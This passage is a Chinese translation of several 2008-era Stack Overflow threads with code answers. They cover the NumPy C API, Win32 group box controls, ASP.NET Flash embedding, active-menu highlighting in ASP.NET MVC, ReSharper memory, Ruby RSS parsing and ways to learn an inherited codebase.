     int dims[] = { 2, 3 };
     PyObject *op, *array;
     PyArray_Descr *descr;

     Py_Initialize();
     import_array();
     op = Py_BuildValue("[(s, s), (s, s)]", "a", "i4", "b", "U5");
     PyArray_DescrConverter(op, &descr);
     Py_DECREF(op);
     array = PyArray_SimpleNewFromDescr(2, dims, descr);
     PyObject_Print(array, stdout, 0);
     printf("\n");
     Py_DECREF(array);
     return 0;
} 
```

感谢[Adam Rosenfield指出](https://stackoverflow.com/users/9530/adam-rosenfield)[NumPy 指南的](http://numpy.scipy.org/numpybook.pdf)第 13.3.10 节。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-10-18T04:33:02.827

请参阅[NumPy 指南](http://csc.ucdavis.edu/~chaos/courses/nlp/Software/NumPyBook.pdf)，第 13.3.10 节。有很多不同的方法来制作描述符，虽然它不像写那么容易`[('a', 'i4'), ('b', 'U5')]`。

# c - 如何在组框内放置子控件？

> ID：214553
> 
> 赞同：4
> 
> 时间：2008-10-18T04:06:28.810
> 
> 标签：c, user-interface, winapi

当我启用通用控件视觉样式支持 (InitCommonControls()) 并且我使用除 Windows 经典主题之外的任何主题时，组框内的按钮会显示为带有方角的黑色边框。

Windows 经典主题显示正常，以及当我关闭视觉样式时。

我正在使用以下代码：

```
group_box = CreateWindow(TEXT("BUTTON"), TEXT("BS_GROUPBOX"), 
    WS_CHILD | WS_VISIBLE | BS_GROUPBOX | WS_GROUP,
    10, 10, 200, 300,
    hwnd, NULL, hInstance, 0);

push_button = CreateWindow(TEXT("BUTTON"), TEXT("BS_PUSHBUTTON"),
    WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
    40, 40, 100, 22,
    group_box, NULL, hInstance, 0); 
```

编辑：单选按钮也会出现问题

编辑：我没有使用任何对话框/资源，只使用 CreateWindow/Ex。

我在 Visual C++ 2008 Express SP1 下编译，带有一个通用[清单](http://msdn.microsoft.com/en-us/library/ms997646.aspx)文件

[截图 http://img.ispankcode.com/black_border_issue.png](http://img.ispankcode.com/black_border_issue.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-11-17T19:29:10.897

问题在于将 groupbox 作为控件的父级。Groupboxes 不应该有任何孩子，将它们用作父母会导致各种错误（包括绘画、键盘导航和消息传播）。只需将按钮的 CreateWindow 调用中的父级从**group_box 更改**为**hwnd**（即对话框）。

我猜您使用 groupbox 作为父级，以便在其中轻松定位其他控件。正确的方法是获取 groupbox 客户区的位置并将其映射到对话框的客户区。然后，放置在生成的 RECT 中的所有内容都将出现在 groupbox 中。由于组框实际上没有客户区，因此可以使用以下方式计算：

```
// Calculate the client area of a dialog that corresponds to the perceived
// client area of a groupbox control. An extra padding in dialog units can
// be specified (preferably in multiples of 4).
//
RECT getClientAreaInGroupBox(HWND dlg, int id, int padding = 0) {
    HWND group = GetDlgItem(dlg, id);
    RECT rc;
    GetWindowRect(group, &rc);
    MapWindowPoints(0, dlg, (POINT*)&rc, 2);

    // Note that the top DUs should be 9 to completely avoid overlapping the
    // groupbox label, but 8 is used instead for better alignment on a 4x4
    // design grid.
    RECT border = { 4, 8, 4, 4 };
    OffsetRect(&border, padding, padding);
    MapDialogRect(dlg, &border);

    rc.left += border.left;
    rc.right -= border.right;
    rc.top += border.top;
    rc.bottom -= border.bottom;
    return rc;
} 
```

请注意，这同样适用于 Tab 控件。他们也不是为父母而设计的，并且会表现出类似的行为。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-18T06:39:10.717

这里只是一个猜测，但看起来您正在从您的主题继承静态边缘或客户端边缘样式。我从资源编辑器创建了大部分对话框，并在那里设置了这些属性。

在您的情况下，您可以用 CreateWindowEx 替换您的[CreateWindow](http://msdn.microsoft.com/en-us/library/ms632680(VS.85).aspx)来设置这些扩展样式，这些样式可能在 CreateWindow 中被默认设置。具体查看`WS_EX_STATICEDGE, WS_EX_WINDOWEDGE and WS_EX_CLIENTEDGE`

编辑：我假设这没有发生，因为您的按钮是对话框中的默认控件，这也会产生黑色边缘。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-22T17:52:26.207

显然，分组框并不意味着对控件进行分组（成为父 hwnd）

因此，为了摆脱黑色边框/绘画问题，我必须对组框进行子类化并实现 WM_PAINT 和 WM_PRINTCLIENT

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2008-10-24T17:24:17.997

啊，是的，带有单选按钮和组框的黑色背景。虽然我不确定这是否适用于 VC++ 2008，但过去 VB6 主题应用程序的解决方案是先将无线电控件放在 PictureBox（实际上是一个通用容器）上，然后将其添加到组框。

值得一试！

# c# - 以编程方式将 .swf 添加到 asp.net 页面的最佳方法是什么？

> ID：214568
> 
> 赞同：0
> 
> 时间：2008-10-18T04:25:26.977
> 
> 标签：c#, .net, asp.net, custom-server-controls

有没有一种以编程方式将 .swf 添加到 asp.net 页面上的面板的好方法 - 即：我知道我可以插入 html 标签：

IE：

```
<object type="application/x-shockwave-flash" data="yourflash.swf" width="" height="">
<param name="movie" value="yourflash.swf">
</object> 
```

但是是否已经有一个现有的 .net 或免费的 FLASH 组件，您只需在其上设置属性，还是我需要自己创建一个自定义 Web 控件（不是首选），所以我不必不断地这样做？

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-18T05:05:58.423

`FlashObject.cs`：

```
namespace MyNamespace 
{ 
 using System.Web.UI;

 public class FlashObject : Control
 { public int Width  {get;set}
   public int Height {get;set}
   [UrlProperty] pubic string SourceUrl {get;set;}

   protected override Render(HtmlWriter writer)
    { writer.WriteLine( "<object type='application/x-shockwave-flash' "
                       +" data='{0}' width='{1}' height='{2}'>\r\n"
                       +"    <param name='movie' value='{0}'>\r\n</object>"
                       ,ResolveUrl(SourceUrl)
                       ,Width
                       ,Height);
    }
 }
} 
```

`Web.config`：

```
 <system.web> 
     <controls>
       <add tagPrefix="my" namespace="MyNamespace" assembly="MyAssembly" />
     </controls>
  </system.web> 
```

`MyPage.aspx`：

```
 <my:FlashObject SourceUrl='~/yourflash.swf' runat='server' /> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-18T08:14:47.293

像上面那样做，但不是发出对象并嵌入代码，而是包含 swfobject [http://code.google.com/p/swfobject/](http://code.google.com/p/swfobject/)并在您的页面中发出一些不错的非侵入式 javascript 以插入 swf！

# c# - 我可以发誓我曾经做过“new Literal(“ hello there ”);

> ID：214572
> 
> 赞同：0
> 
> 时间：2008-10-18T04:29:40.137
> 
> 标签：c#, .net, .net-2.0

我本可以发誓我已经在某个地方做过这件事——我现在使用的是 2.0——这是我在以后的版本中发现的吗？IE：在构造函数中传递一个 Literal 的内容

我记得我自己说“嗯，一直以来我都创建了一个新实例，然后设置了 text 属性”——还是那天晚上我喝醉了？如果没有，为什么不！！！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-18T04:34:53.730

也许[是字面控制](http://msdn.microsoft.com/en-us/library/system.web.ui.literalcontrol.aspx)？

```
this.Controls.Add(new LiteralControl("<b>hello there</b>")); 
```

请注意，它不维护 ViewState，因此必须在每个请求中添加它。

# asp.net-mvc - 在 asp.net mvc 母版页的导航列表中添加“活动”标签

> ID：214583
> 
> 赞同：35
> 
> 时间：2008-10-18T04:42:24.837
> 
> 标签：asp.net-mvc

在默认的asp.net mvc项目中，在Site.Master文件中，有一个菜单导航列表：

```
<div id="menucontainer">
    <ul id="menu">              
        <li><%= Html.ActionLink("Home", "Index", "Home")%></li>
        <li><%= Html.ActionLink("About Us", "About", "Home")%></li>
    </ul>
</div> 
```

这在浏览器中呈现为：

```
<div id="menucontainer"> 
    <ul id="menu">              
        <li><a href="/">Home</a></li> 
        <li><a href="/Home/About">About Us</a></li> 
    </ul> 
</div> 
```

我希望能够根据正在调用的视图动态设置活动列表项。也就是说，当用户查看主页时，我希望创建以下 HTML：

```
<div id="menucontainer"> 
    <ul id="menu">              
        <li class="active"><a href="/">Home</a></li> 
        <li><a href="/Home/About">About Us</a></li> 
    </ul> 
</div> 
```

我希望这样做的方法是：

```
<div id="menucontainer">
    <ul id="menu">              
        <li <% if(actionName == "Index"){%> class="active"<%}%>><%= Html.ActionLink("Home", "Index", "Home")%></li>
        <li <% if(actionName == "About"){%> class="active"<%}%>><%= Html.ActionLink("About Us", "About", "Home")%></li>
    </ul>
</div> 
```

这里的关键是`<% if(actionName == "Index"){%> class="active"<%}%>`线。我不知道如何确定当前的 actionName 是什么。

关于如何做到这一点的任何建议？或者，如果我完全走错了路，有没有更好的方法来做到这一点？

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2008-12-14T02:03:53.073

我给自己做了一个辅助方法来处理这类事情。在我的母版页后面的代码中（可以推送到扩展方法......可能是更好的方法），我输入了以下代码。

```
protected string ActiveActionLinkHelper(string linkText, string actionName, string controlName, string activeClassName)
{
    if (ViewContext.RouteData.Values["action"].ToString() == actionName && 
            ViewContext.RouteData.Values["controller"].ToString() == controlName)
        return Html.ActionLink(linkText, actionName, controlName, new { Class = activeClassName });

    return Html.ActionLink(linkText, actionName, controlName);
} 
```

然后，我只是在我的页面中这样调用它：

```
<%= ActiveActionLinkHelper("Home", "Index", "Home", "selected")%> 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-10-22T14:59:32.500

在视图中，您可以通过以下方式获取当前操作名称：

```
ViewContext.RouteData.Values["action"].ToString() 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2008-11-28T17:08:32.630

您也可以尝试从其控制器名称和视图名称中检测哪个是当前选定的选项卡，然后添加类属性。

```
public static string MenuActionLink(this HtmlHelper helper, string linkText, string actionName, string controllerName)
{
    var htmlAttributes = new RouteValueDictionary();

    if (helper.ViewContext.Controller.GetType().Name.Equals(controllerName + "Controller", StringComparison.OrdinalIgnoreCase))
    {
        htmlAttributes.Add("class", "current");
    }

    return helper.ActionLink(linkText, actionName, controllerName, new RouteValueDictionary(), htmlAttributes);
} 
```

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2011-11-29T14:22:13.473

在 MVC 3 Razor View Engine 中，您可以这样做：

```
@{string ctrName = ViewContext.RouteData.Values["controller"].ToString();}

<div id="menucontainer">
  <ul id="menu"> 
    <li @if(ctrName == "Home"){<text> class="active"</text>}>@ Html.ActionLink("Home",  "Index", "Home")</li>
    <li @if(ctrName == "About"){<text> class="active"</text>}>@ Html.ActionLink("About Us", "About", "Home")</li>
  </ul>
</div> 
```

当我有两个页面时，我的示例工作：Home/About 并且它的控制器具有相同的名称索引，所以我得到控制器名称以区分而不是行动。如果您想采取行动，只需替换为以下内容：

```
@{string ctrName = ViewContext.RouteData.Values["action"].ToString();} 
```

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2015-06-29T19:27:15.480

一个老问题，但希望有人会觉得这很有帮助。

1.  **在ViewBag**中放置一些可以用来识别页面的东西，我使用**了 ViewgBag.PageName**

例如，在**index.cshtml**中，放置类似

```
@{
    ViewBag.PageName = "Index";
} 
```

2.  如果正在访问的页面具有所需的值，则使用条件语句为每个链接项添加一个类，以返回*活动状态*，否则返回空字符串。详情请查看下方：

```
<li class="@((ViewBag.PageName == "Index") ? "active" : "")"><a href="@Url.Action("Index","Home")">Home</a></li>
<li class="@((ViewBag.PageName == "About") ? "active" : "")"><a href="@Url.Action("About","Home")">About</a></li>
<li class="@((ViewBag.PageName == "Contact") ? "active" : "")"><a href="@Url.Action("Contact","Home")">Contact</a></li>
```

我不只是测试它，我在我的项目中使用这种方法

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2012-06-01T12:24:25.857

为了贡献我自己的答案（在 MVC4 中测试），我从其他答案中提取了一些最好的部分，修复了一些问题，并添加了一个帮助程序来处理不一定通过 Controller & Action 解决的 url（例如，如果你有一个嵌入式 CMS 处理一些页面链接等）

代码也可以在 github 上分叉：[https ://gist.github.com/2851684](https://gist.github.com/2851684)

```
/// 
/// adds the active class if the link's action & controller matches current request
/// 
public static MvcHtmlString MenuActionLink(this HtmlHelper htmlHelper,
    string linkText, string actionName, string controllerName,
    object routeValues = null, object htmlAttributes = null,
    string activeClassName = "active")
{
    IDictionary htmlAttributesDictionary =
        HtmlHelper.AnonymousObjectToHtmlAttributes(htmlAttributes);

    if (((string)htmlHelper.ViewContext.RouteData.Values["controller"])
            .Equals(controllerName, StringComparison.OrdinalIgnoreCase) &&
        ((string)htmlHelper.ViewContext.RouteData.Values["action"])
            .Equals(actionName, StringComparison.OrdinalIgnoreCase))
    {
        // careful in case class already exists
        htmlAttributesDictionary["class"] += " " + activeClassName;
    }

    return htmlHelper.ActionLink(linkText, actionName, controllerName,
                                    new RouteValueDictionary(routeValues),
                                    htmlAttributesDictionary);
}

/// 
/// adds the active class if the link's path matches current request
/// 
public static MvcHtmlString MenuActionLink(this HtmlHelper htmlHelper,
    string linkText, string path, object htmlAttributes = null,
    string activeClassName = "active")
{
    IDictionary htmlAttributesDictionary =
        HtmlHelper.AnonymousObjectToHtmlAttributes(htmlAttributes);
    if (HttpContext.Current.Request.Path
        .Equals(path, StringComparison.OrdinalIgnoreCase))
    {
        // careful in case class already exists
        htmlAttributesDictionary["class"] += " " + activeClassName;
    }
    var tagBuilder = new TagBuilder("a")
                            {
                                InnerHtml = !string.IsNullOrEmpty(linkText)
                                                ? HttpUtility.HtmlEncode(linkText)
                                                : string.Empty
                            };
    tagBuilder.MergeAttributes(htmlAttributesDictionary);
    tagBuilder.MergeAttribute("href", path);
    return MvcHtmlString.Create(tagBuilder.ToString(TagRenderMode.Normal));
}
```

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2014-03-23T19:19:37.097

将 MVC3 与 Razor 视图一起使用提供了另一种选择：

_Layout.cshtml：

```
<li class="@ViewBag.NavClassHome">@Html.ActionLink("Home", "Index", "Home")</li>
<li class="@ViewBag.NavClassAbout">@Html.ActionLink("Disclaimer", "About", "Home")</li> 
```

家庭控制器：

```
public ActionResult Index() {
    ViewBag.NavClassHome = "active";
    return View();
} 

public ActionResult About() {
    ViewBag.NavClassAbout = "active";
    return View();
} 
```

如果您还想为回发保留它，您还必须在此处分配 ViewBag 值：

```
[HttpPost]
public ActionResult Index() {
    ViewBag.NavClassHome = "active";
    return View();
}

[HttpPost]
public ActionResult About() {
    ViewBag.NavClassAbout = "active";
    return View();
} 
```

经过测试并且对我来说工作正常，但是您的服务器端代码中将有一个 css 类名。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2013-03-09T20:54:23.720

I wanted to have a bit more control over my layout, and this is what I did.

Create a LayoutModel that other models inherit:

```
public abstract class LayoutModel
{
    public CurrentPage CurrentPage { get; set; }
} 
```

Create a LayoutAttribute that inherits from ActionFilterAttribute like so:

```
public class LayoutAttribute : ActionFilterAttribute
{
    private CurrentPage _currentPage { get; set; }

    public LayoutAttribute(
        CurrentPage CurrentPage
    ){
        _currentPage = CurrentPage;
    }

    public override void OnActionExecuted(ActionExecutedContext filterContext)
    {
        var result = filterContext.Result as ViewResultBase;
        if (result == null || result.Model == null || !(result.Model is LayoutModel)) return;

        ((LayoutModel)result.Model).CurrentPage = _currentPage;
    }
} 
```

Now on the Action or Controller level I can set the current page (and other stuff if I wanted) like this:

```
[Layout(CurrentPage.Account)]
public class MyController : Controller
{

} 
```

In my layout view I now have access to the current page, and whatever else I add to the LayoutModel.

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-11-28T17:52:17.347

这应该在客户端使用 jQuery，使用 Google 提供最新的 jQuery 库：

```
<script src="http://www.google.com/jsapi" type="text/javascript" language="javascript"></script>
<script type="text/javascript" language="javascript">google.load("jquery", "1");</script>  

<script language="javascript" type="text/javascript">
      $(document).ready(function(){
          var str=location.href.toLowerCase(); 
        $('#menucontainer ul#menu li a').each(function() {
                if (str.indexOf(this.href.toLowerCase()) > -1) {
                        $(this).attr("class","current"); //hightlight parent tab
                     }  
                });
      });  
    </script> 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-10-18T18:28:18.957

你的视图必须知道你的控制器的动作这一事实打破了 MVC 模式。也许您的控制器可以将一些“控制”信息传递给视图以最终允许它完成相同的事情，唯一的区别是谁负责。

就像在控制器的操作中一样，您可以：

```
public ActionResult Index(){
     ViewData["currentAction"] = "Index";
     //... other code
    return View();
} 
```

然后在您看来，您可以：

```
<% if( ((string)ViewData["currentAction"]) == "Index" {%> <!- some links --><% } %>
<% if( ((string)ViewData["currentAction"]) == "SomethingElse" {%> <!- some links --><% } %> 
```

但是，我想得越多，我就越质疑为什么您对多个操作使用相同的视图。观点**有那么**相似吗？

如果用例证明它是合理的，那么请遵循我的上述建议。但否则，也许您可​​以将事情分解为多个视图（每个控制器操作一个），问题就会自行解决。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-10-23T16:04:55.877

根据之前的答案，这是我当前针对同一问题的解决方案：

在母版页中，我给每个 li 一个对应于控制器和操作的 id，因为这应该从 ActionLink 中知道。我以前使用页面标题执行此操作，但这有助于组织。

Site.Master：

```
<ul id="menu">
    <li id="menuHomeIndex" runat="server"><%= Html.ActionLink("Home", "Index", "Home") %></li>
    <li id="menuHomeAbout" runat="server"><%= Html.ActionLink("About Us", "About", "Home") %></li>
</ul> 
```

站点.Master.cs：

```
// This is called in Page_Load
private void SetActiveLink()
{
    string action = "" + ViewContext.RouteData.Values["controller"] + ViewContext.RouteData.Values["action"];
    var activeMenu = (HtmlGenericControl)Page.Master.FindControl("menu" + action);

    if (activeMenu != null)
    {
        activeMenu.Attributes.Add("class", "selected");
    }
} 
```

它比内联代码工作更多，但我认为它更干净，还可以让您在不同的控制器中使用相同名称的操作。因此，如果您使用不同的控制器添加更多菜单项，则并非所有名为 Index 的操作都会在菜单中突出显示。

如果有人发现这种方法有问题，请告诉我。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2011-08-01T03:33:17.293

将 MVC3 与 Razor 视图一起使用，您可以像这样实现：

```
<ul id="menu">
 @if (ViewContext.RouteData.Values["action"].ToString() == "Index")
 {
 <li class="active">@Html.ActionLink("Home", "Index", "Home")</li>
 }
 else
 {
 <li>@Html.ActionLink("Home", "Index", "Home")</li>
 }
 @if (ViewContext.RouteData.Values["action"].ToString() == "About")
 {
 <li class="active">@Html.ActionLink("About", "About", "Home")</li>
 }
 else
 {
 <li>@Html.ActionLink("About", "About", "Home")</li>
 }
</ul> 
```

然后应用您的“.active”类风格，例如：

```
ul#menu li.active 
{
 text-decoration:underline;
} 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2012-05-21T09:58:36.580

这是与当前版本的 MVC4 兼容的版本。
我已将 Adam Carr 的代码重写为扩展方法。

```
using System;
using System.Web.Mvc;
using System.Web.Mvc.Html;
using System.Web.Routing;

namespace MyApp.Web {
    public static class HtmlHelpers {
        /// <summary>
        /// Returns an anchor element (a element) that contains the virtual path of the
        /// specified action. If the controller name matches the active controller, the
        /// css class 'current' will be applied.
        /// </summary>
        public static MvcHtmlString MenuActionLink(this HtmlHelper helper, string linkText, string actionName, string controllerName) {
            var htmlAttributes = new RouteValueDictionary();
            string name = helper.ViewContext.Controller.GetType().Name;

            if (name.Equals(controllerName + "Controller", StringComparison.OrdinalIgnoreCase))
                htmlAttributes.Add("class", "current");

            return helper.ActionLink(linkText, actionName, controllerName, new RouteValueDictionary(), htmlAttributes);
        }
    }
} 
```

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2020-07-10T12:33:54.547

希望这会有所帮助。

```
<ul>
    <li class="@(ViewContext.RouteData.Values["Controller"].ToString() == "Home" ? "active" : "")">
        <a asp-area="" asp-controller="Home" asp-action="Index"><i class="icon fa fa-home"></i><span>Home</span>
        </a>
    </li>
</ul> 
```

* * *

## 回答 #15

> 赞同：-1
> 
> 时间：2008-10-19T11:49:06.547

尝试

应该工作正常！

编辑：在 Beta1 中删除

从 ViewContext 类中删除了 ViewName 属性。

# visual-studio-2008 - Visual Studio 2008 中的 Resharper 内存使用情况

> ID：214584
> 
> 赞同：6
> 
> 时间：2008-10-18T04:42:42.933
> 
> 标签：visual-studio-2008, resharper

您能否提出一些减少 VS 2008 中 Resharper 内存使用的方法/提示。我的 VS 的 50 个项目的工作集内存约为 650mb+

**编辑：**现在 4.5 出来了，这个问题不再相关。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-04-20T09:07:27.780

650mb+ 没有异常，我有 15 个项目和 1k 文件的解决方案，VS+ReSharper 使用 500mb（只有 ReSharper 使用 153mb）

试试这个来显示 ReSharper 使用了多少内存 ReSharper -> 选项 -> 常规 -> 在状态栏中显示托管内存使用情况

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-10-18T07:26:12.993

*当您有50*个项目时，这听起来不像是完全不合理的内存量，它们真的都需要在同一个解决方案中吗？如果是这样，你能不能只获得更多的内存？虽然可能有减少 R# 内存使用的方法（禁用其代码分析？）我怀疑它不会*有*太大的不同。我怀疑最终您将不得不接受具有大量解决方案的现代 IDE 需要强大的机器。

# javascript - 在 Flex 应用程序 html 页面上加载 ActiveX 对象

> ID：214588
> 
> 赞同：1
> 
> 时间：2008-10-18T04:46:44.047
> 
> 标签：javascript, html, apache-flex, activex

我试图在我的 flex 应用程序所在的同一页面上加载一个 activex 对象。这可能吗？我可以在一页上有 2 个对象标签吗？

到目前为止，flex 应用程序加载正常，但是当我尝试访问 activeX 控件时，它说它为空。但是，如果我在自己的网页上有相同的 activex 控件，它就可以正常工作。

有任何想法吗？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-18T04:59:19.687

哎呀，我发现了错误。这是我的 javascript 代码中的一个简单错误。事实证明，添加另一个 Object 标记并加载另一个 activex 控件可以正常工作。将此作为学习经验。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-18T06:40:35.690

你为什么不发布你的错误，这样我们都会从你学到的东西中受益——也许你的错误很常见。

感谢您回答您自己的问题。可能想更改标题，使其显示已解决。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-18T13:59:53.353

其中一个问题是我的浏览器正在缓存页面，我意识到一旦我更改了 ActiveX 对象的名称，抛出的错误仍然是引用 ActiveX 对象的旧名称。另一个错误是我在 javascript 代码中有一个与 ActiveX 对象同名的 Var，这似乎导致它失败，尽管我不完全确定原因。一旦我删除了该变量，脚本就可以正常工作。前一天我遇到了同样的问题，只是第二次没有注意到它，因为我已经连续几天研究这个集成了。

# ruby-on-rails - 在 Ruby/Rails 中解析 A tom 和 RSS？

> ID：214590
> 
> 赞同：29
> 
> 时间：2008-10-18T04:49:57.193
> 
> 标签：ruby-on-rails, ruby, rss, atom-feed

我正在寻找可以让我在 Ruby 和 Rails 中解析 A​​tom 和 RSS 的东西。我查看了标准的 RSS 库，但是是否有一个库可以自动检测它是什么类型的提要并为我解析它？

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2009-10-21T19:54:31.463

Feedzirra 是更好的选择之一：http: [//www.pauldix.net/2009/02/feedzirra-a-ruby-feed-library-built-for-speed.html](http://www.pauldix.net/2009/02/feedzirra-a-ruby-feed-library-built-for-speed.html)

当然，自从我写了它，我就有偏见。:)

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2008-10-18T05:09:10.790

Googleage 揭示了一些事情。他们不被接受吗？

[简单的 RSS](http://simple-rss.rubyforge.org/)
[Ruby-Feedparser](http://home.gna.org/ruby-feedparser/)

```
require 'simple-rss'
require 'open-uri'
rss = SimpleRSS.parse open('http://slashdot.org/index.rdf')
rss.channel.title # => "Slashdot" 
```

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2008-10-21T10:44:58.067

如果您遇到糟糕的提要，您可能需要使用[HPricot](http://code.whytheluckystiff.net/hpricot/)来解析提要。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-03-25T05:18:50.870

Feed Normalizer 看起来可能是一个不错的选择

[https://github.com/aasmith/feed-normalizer](https://github.com/aasmith/feed-normalizer)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-07-17T17:31:15.233

看起来 2009 年标准的[Ruby RSS 库](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/rss/rdoc/RSS.html)还不存在？

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-10-21T19:56:51.937

我喜欢使用 niokrigi 或 scrapi 来解析 atom/rss 提要中的 xml。 [http://www.rubyinside.com/nokogiri-ruby-html-parser-and-xml-parser-1288.html](http://www.rubyinside.com/nokogiri-ruby-html-parser-and-xml-parser-1288.html)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2011-12-05T19:44:48.767

我尝试过 Feedzirra 和 SimpleRSS，我发现它们都很好用。不过，Feedzirra 速度更快，因此如果您正在寻找它的性能，那么使用 Feedzirra 会更好。

# language-agnostic - 熟悉继承代码库的最佳方式

> ID：214605
> 
> 赞同：21
> 
> 时间：2008-10-18T05:05:39.347
> 
> 标签：language-agnostic, legacy-code

Stacker 没有人询问[新程序员进入该领域时发现的最令人震惊的事情](https://stackoverflow.com/questions/214452/what-surprised-you-the-most-about-the-software-industry)。

排在首位的是继承一个必须迅速熟悉的代码库的影响。突然发现自己负责维护 N 行代码，这些代码已经被拼凑了多久，并且有很短的时间开始为它做出贡献，这可能会非常令人震惊。

您如何有效地吸收所有这些新数据？是什么缓解了这种转变？已经为足够多的开源项目做出贡献的唯一真正的解决方案是冲击消退吗？

这也适用于资深程序员。您使用什么技术来简化向新代码库的过渡？

我为此添加了 Community-Building 标签，因为我还想听听一些关于这些过渡的战争故事。随意分享您如何处理特别紧张的学习曲线。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2008-10-18T05:38:30.200

铅笔和笔记本（不要分心试图创建一个未经请求的解决方案）

*   边走边做笔记，每周一花一个小时通读并整理前几周的笔记

*   对于大型代码库，第一印象可能具有欺骗性，并且当您熟悉自己时，问题往往会迅速重新排列。

*   请记住，您上一个工作环境中的问题在您的新环境中不一定有效或密切相关。谨防先入为主的观念。

*   您所做的笔记/观察将帮助您快速了解要问什么问题以及问谁。希望您一直在收集所有官方（和非官方）利益相关者的姓名。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2008-10-18T05:26:23.033

熟悉继承代码的最好方法之一就是亲自动手。从修复一些简单的错误开始，然后逐步解决更复杂的错误。与尝试系统地审查代码相比，这会让您更好地熟悉代码。

如果有需求或功能规范文档（希望是最新的），您**必须**阅读它。

如果有高级或详细的设计文档（希望是最新的），您**可能应该**阅读它。

另一个好方法是与熟悉代码的人安排一次“信息传递”会议，在那里他们提供高级设计的演示文稿，并对代码的重要/棘手部分进行演练。

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2008-10-18T05:09:14.767

编写单元测试。您会更快地发现缺陷，并且在需要更改代码时更加自信。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-10-18T08:53:55.000

Try to understand the business logic behind the code. Once you know why the code was written in the first place and what it is supposed to do, you can start reading through it, or as someone said, prolly fixing a few bugs here and there

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-18T07:07:26.790

我的步骤是：

1.) 在代码库中设置包含所有源代码、头文件的源代码洞察（或您使用的任何好的源代码浏览器）工作区/项目。从最高功能（主要）到最低功能在更高级别浏览。在此代码浏览期间，请继续在纸/或 word 文档上做笔记，以跟踪函数调用的流程。在这一步中不要进入函数实现细节，保留它以供以后的迭代。在这一步中，跟踪传递给函数的参数、返回值、传递给函数的参数如何初始化、如何修改这些参数集的值、如何使用返回值？

2.）在步骤 1.）的一次迭代之后，您在代码库中使用了一定级别的代码和数据结构，设置 MSVC（或根据代码库的编程语言的任何其他相关编译器项目），编译代码，使用有效的测试用例执行，然后从 main 再次单步执行代码，直到函数的最后一级。在函数调用之间，不断移动传递、返回的变量值、采用的各种代码路径、避免的各种代码路径等。

3.) 不断重复 1.) 和 2.) 直到您觉得可以更改一些代码/添加一些代码/在现有代码中查找错误/修复错误为止！

-广告

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-10-18T05:20:27.803

我不知道这是“最好的方法”，但我最近的工作是编写一个代码蜘蛛/解析器（在 Ruby 中），它通过并构建了一个调用树（和一个反向调用树），它我可以稍后查询。这有点不重要，因为我们有 PHP，它调用 Perl，它调用 SQL 函数/过程。任何其他代码爬取工具都会以类似的方式提供帮助（即 javadoc、rdoc、perldoc、[Doxygen](http://www.doxygen.nl/)等）。

阅读任何单元测试或规范都会很有启发性。

记录事情会有所帮助（对自己或其他队友，当前和未来）。阅读任何现有文档。

当然，不要低估简单地向队友（或你的老板！）提问的力量。早些时候，我经常根据需要询问“我们是否有执行 X 的函数/脚本/foo？”

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-18T05:37:08.487

浏览核心库并阅读函数声明。如果是 C/C++，这意味着只有标题。记录你不理解的任何东西。

上次我这样做时，我插入的评论之一是“从未使用过此类”。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-10-18T06:38:30.657

请尝试通过修复其中的错误来理解代码。纠正或维护文档。不要修改代码本身的注释，这可能会引入新的错误。

在我们的工作中，一般来说，我们不会无故更改生产代码。这包括外观变化；即使这些也会引入错误。

无论一段代码看起来多么令人作呕，除非您有错误修复或其他更改要做，否则不要试图重写它。如果您在阅读尝试学习的代码时发现错误（或可能的错误），请记录错误以供以后分类，但不要尝试修复它。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2014-03-20T21:43:46.483

## Another Procedure...

After reading Andy Hunt's **"Pragmatic Thinking and Learning - Refactor Your Wetware"** (which doesn't address this directly), I picked up a few tips that may be worth mentioning:

**Observe Behavior:**

If there's a UI, all the better. Use the app and get a mental map of relationships (e.g. links, modals, etc). Look at HTTP request if it helps, but don't put too much emphasis on it -- you just want a light, friendly acquaintance with app.

**Acknowledge the Folder Structure:**

Once again, this is light. Just see what belongs where, and hope that the structure is semantic enough -- you can always get some top-level information from here.

